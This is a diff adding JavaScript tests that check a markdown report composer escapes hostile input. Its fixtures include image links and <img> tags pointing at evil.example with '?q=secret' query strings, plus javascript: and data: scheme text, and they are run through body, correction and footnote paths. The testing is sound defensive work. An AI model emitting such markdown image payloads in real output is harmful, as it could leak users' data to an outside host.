@@ -1410,3 +1410,100 @@ test('R1-M5 imageFileBase: the title is made safe for a file name and the number
   assert.equal(imageFileBase('///', 1), 'research-image 1');
   assert.ok(imageFileBase('長'.repeat(200), 1).length <= 62);
 });
+
+// ---------- R2 F3: plain text is escaped, never edited; one invariant over every hostile and generated input ----------
+const R2_N1 = [
+  '!javascript:x[a](https://evil.example/i.png)',
+  '!![i](https://x.example/)[java](javascript:1)script:y[a](https://evil.example/i.png)'
+];
+const R1_HOSTILE = [
+  '![a [b] c](https://evil.example/x.png?q=secret)',
+  '![x]\n\n[x]: https://evil.example/i.png',
+  '![x][r]\n\n[r]: https://evil.example/i.png',
+  '<img src="https://evil.example/p.png?q=secret"> ![x](https://evil.example/i.png)',
+  '[<img src="https://evil.example/p.png">](https://ok.example/)'
+];
+const SAVED = [{ path: 'Att/a.png', image: IMAGE(1) }];
+
+// Escaped pairs blanked out, what is left is what a markdown reader would treat as syntax.
+const bare = text => text.replace(/\\[\s\S]/g, '  ');
+function assertSafe(out, label) {
+  const b = bare(out);
+  assert.doesNotMatch(b, /!\[(?!\[Att\/a\.png\]\])/, `${label}: unescaped image opener in ${JSON.stringify(out)}`);
+  assert.doesNotMatch(b, /<[A-Za-z!\/]/, `${label}: unescaped tag in ${JSON.stringify(out)}`);
+  assert.doesNotMatch(out, /<img/i, label);
+  assert.doesNotMatch(b, /!\[[^\]]*\]\([^)]*evil/, `${label}: image destination`);
+}
+const through = (text, path) => {
+  try {
+    return throughUnchecked(text, path);
+  } catch (error) {
+    // Nothing usable left: the failure path writes nothing, which is safe.
+    if (/沒有可用內容|no usable content/.test(error.message)) return '';
+    throw error;
+  }
+};
+const throughUnchecked = (text, path) => {
+  if (path === 'detail') return composePhase2Detail(verifyResult({ detail: `## 概念\n\n${text}` }), SAVED).detail;
+  if (path === 'correction')
+    return composePhase2Detail(
+      verifyResult({ detail: '外套很保暖。', verdicts: [{ sentence: '外套很保暖。', verdict: 'unsupported', correction: text }] }),
+      SAVED
+    ).detail;
+  return composePhase2Detail(
+    verifyResult({ detail: '句子[^1]。', footnotes: [{ id: '1', url: 'https://ok.example/', title: text }] }),
+    SAVED
+  ).detail;
+};
+
+test('R2-N1 the two reported inputs: no image opener survives in the body, a correction or a footnote title', () => {
+  for (const input of R2_N1)
+    for (const path of ['detail', 'correction', 'title']) {
+      const out = through(input, path);
+      assertSafe(out, `${path} ${input}`);
+      assert.match(out, /script:/, 'scheme text is kept as text');
+    }
+});
+
+test('R2-N1 plain text is escaped, not edited: scheme words and active characters stay, each active one behind a backslash', () => {
+  const out = through('see javascript:alert(1) and data:text/html!, `x` a>b', 'detail');
+  assert.match(out, /javascript:alert\\\(1\\\)/);
+  assert.match(out, /data:text\/html\\!,/);
+  assert.match(out, /\\`x\\`/);
+  assert.match(out, /a\\>b/);
+});
+
+test('R2-N1 invariant: every hostile input and ~240 generated combinations leave no image opener, no tag, and build the same twice', () => {
+  const nodes = ['[a](https://ok.example/p)', '[^1]', '![[Att/a.png]]', '[b](https://ok2.example/)'];
+  const inserts = ['!', '[', ']', '(', ')', 'javascript:', 'data:', '<img src=https://evil/>', '![x](https://evil.example/i.png)', '\\'];
+  let seed = 12345;
+  const next = n => {
+    seed = (seed * 1103515245 + 12345) % 2147483648;
+    return seed % n;
+  };
+  const inputs = [...R2_N1, ...R1_HOSTILE];
+  while (inputs.length < 246) {
+    const parts = [];
+    for (let k = 0; k < 3; k++) parts.push(inserts[next(inserts.length)], nodes[next(nodes.length)]);
+    parts.push(inserts[next(inserts.length)]);
+    inputs.push(parts.join(''));
+  }
+  assert.ok(inputs.length >= 240);
+  for (const input of inputs)
+    for (const path of ['detail', 'correction', 'title']) {
+      const out = through(input, path);
+      assertSafe(out, `${path} ${input}`);
+      assert.equal(through(input, path), out, `${path} ${input}: second build differs`);
+    }
+});
+
+test('R2-N4 an answer that is empty after corrections fails with seamless_phase2_empty instead of writing nothing', () => {
+  assert.throws(
+    () =>
+      composePhase2Detail(
+        verifyResult({ detail: '外套很保暖。', footnotes: [], verdicts: [{ sentence: '外套很保暖。', verdict: 'unsupported' }] }),
+        []
+      ),
+    /沒有可用內容|no usable content/
+  );
+});
